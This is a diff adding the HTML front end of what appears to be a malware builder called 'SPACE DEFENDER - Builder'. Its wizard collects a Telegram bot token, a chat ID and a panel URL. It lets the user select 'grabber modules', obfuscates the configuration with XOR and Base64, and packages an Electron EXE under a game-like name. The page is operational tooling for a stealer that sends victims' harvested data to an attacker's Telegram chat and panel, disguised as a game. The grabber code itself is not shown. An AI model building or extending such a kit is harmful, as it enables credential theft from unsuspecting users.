@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>SPACE DEFENDER - Builder</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div id="app">
+  <aside id="sidebar">
+    <div class="logo">SD</div>
+    <div class="logo-sub">BUILDER</div>
+    <div class="steps">
+      <div class="step active" data-step="0">
+        <div class="snum">1</div>
+        <div class="sinfo"><strong>Configuration</strong><span>Token, Chat ID, Panel</span></div>
+      </div>
+      <div class="step" data-step="1">
+        <div class="snum">2</div>
+        <div class="sinfo"><strong>Module Selection</strong><span>Grabber Features</span></div>
+      </div>
+      <div class="step" data-step="2">
+        <div class="snum">3</div>
+        <div class="sinfo"><strong>Build</strong><span>Build Application</span></div>
+      </div>
+      <div class="step" data-step="3">
+        <div class="snum">4</div>
+        <div class="sinfo"><strong>Complete</strong><span>Output</span></div>
+      </div>
+    </div>
+  </aside>
+  <main id="main">
+    <div id="pages">
+      <!-- Step 0 -->
+      <div class="page active" id="page-0">
+        <h1>Configuration</h1>
+        <p class="desc">Tokens and credentials are encrypted with XOR + Base64 at build time.</p>
+        <div class="form">
+          <div class="field">
+            <label>Telegram Bot Token</label>
+            <input type="text" id="tgToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" spellcheck="false">
+          </div>
+          <div class="field">
+            <label>Telegram Chat ID</label>
+            <input type="text" id="tgChatId" placeholder="7574310453" spellcheck="false">
+          </div>
+          <div class="field">
+            <label>Panel URL</label>
+            <input type="text" id="panelUrl" value="http://localhost:3456" spellcheck="false">
+          </div>
+          <div class="field">
+            <label>Application Name</label>
+            <input type="text" id="appName" value="Space Defender" spellcheck="false">
+          </div>
+        </div>
+        <div class="nav"><button onclick="next(0)">Next →</button></div>
+      </div>
+      <!-- Step 1 -->
+      <div class="page" id="page-1">
+        <h1>Module Selection</h1>
+        <p class="desc">Select which grabber modules to include.</p>
+        <div class="modules" id="modules"></div>
+        <div class="nav">
+          <button class="sec" onclick="prev(1)">← Back</button>
+          <button onclick="next(1)">Next →</button>
+        </div>
+      </div>
+      <!-- Step 2 -->
+      <div class="page" id="page-2">
+        <h1>Build</h1>
+        <p class="desc">Please wait while the application is being built...</p>
+        <div class="build-status" id="buildStatus">
+          <div class="bline" id="b1"><span class="bspinner">◌</span> Encrypting configuration</div>
+          <div class="bline" id="b2"><span class="bspinner">◌</span> Preparing files</div>
+          <div class="bline" id="b3"><span class="bspinner">◌</span> Packaging with Electron</div>
+          <div class="bline" id="b4"><span class="bspinner">◌</span> Complete</div>
+        </div>
+        <div class="nav" id="buildNav">
+          <button class="sec" onclick="prev(2)">← Back</button>
+          <button id="buildBtn" onclick="startBuild()">🚀 Start Build</button>
+        </div>
+      </div>
+      <!-- Step 3 -->
+      <div class="page" id="page-3">
+        <h1 id="resultTitle">✓ Build Complete!</h1>
+        <div class="result" id="result">
+          <div class="rpath"><strong>EXE:</strong> <span id="rExe">-</span></div>
+          <div class="rpath"><strong>Directory:</strong> <span id="rDir">-</span></div>
+          <div class="rmods"><strong>Modules:</strong> <span id="rMods">-</span></div>
+        </div>
+        <div class="nav">
+          <button class="sec" onclick="resetAll()">← Back to Start</button>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<div id="toasts"></div>
+<script src="script.js"></script>
+</body>
+</html>
